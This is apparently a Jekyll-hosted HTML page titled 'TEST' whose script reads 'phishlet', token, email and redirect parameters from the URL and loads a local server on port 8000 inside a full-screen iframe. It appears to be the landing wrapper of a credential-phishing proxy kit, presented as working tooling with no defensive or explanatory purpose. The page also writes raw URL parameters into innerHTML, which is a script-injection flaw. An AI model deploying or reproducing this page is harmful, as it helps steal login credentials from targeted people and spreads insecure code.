---
layout: page

---
<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>TEST</title>
    <style>
      *{
        margin: 0;
        padding: 0;
        box-sizing: border-box;
      }
    </style>
  </head>
  <body>
    <div id="iframeContainer" style="height:100vh;" ></div>
  </body>
  <script>
    const iframeContainer = document.getElementById("iframeContainer");
    const url = new URL(window.location.href);
    const phishlet = url.searchParams.get("p");
    const token = url.searchParams.get("t");
    const email = url.searchParams.get("e");
    const redirect_url = url.searchParams.get("r");
    let iframe_url = `http://127.0.0.1:8000?un=${Date.now()}`
    if(phishlet){
      iframe_url += `&p=${phishlet}`;
    }
    if(token){
      iframe_url += `&t=${token}`;
    }
    if(redirect_url){
      iframe_url += `&r=${redirect_url}`;
    }
    if(email){
      iframe_url += `&e=${email}`;
    }
    console.log(iframe_url)
    iframeContainer.innerHTML = `<iframe src="${iframe_url}" frameborder="0" style="width:100%;height:99vh;"></iframe>`;

  </script>
</html>
